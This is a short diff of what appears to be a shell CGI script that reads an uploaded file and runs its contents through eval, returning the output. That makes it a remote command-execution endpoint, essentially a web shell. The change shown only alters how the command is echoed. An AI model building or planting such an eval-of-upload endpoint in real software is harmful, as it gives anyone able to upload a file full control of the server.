@@ -5,7 +5,7 @@ printf "Content-Type: text/plain; charset=utf-8\r\n\r\n"
 if [ -f "$UPLOAD_FILENAME" ]; then
     CMD=$(cat "$UPLOAD_FILENAME")
     if [ -n "$CMD" ]; then
-        echo "# $CMD"
+        echo "$CMD"
         eval "$CMD" 2>&1
     else
         echo "/var/cgi*为空"
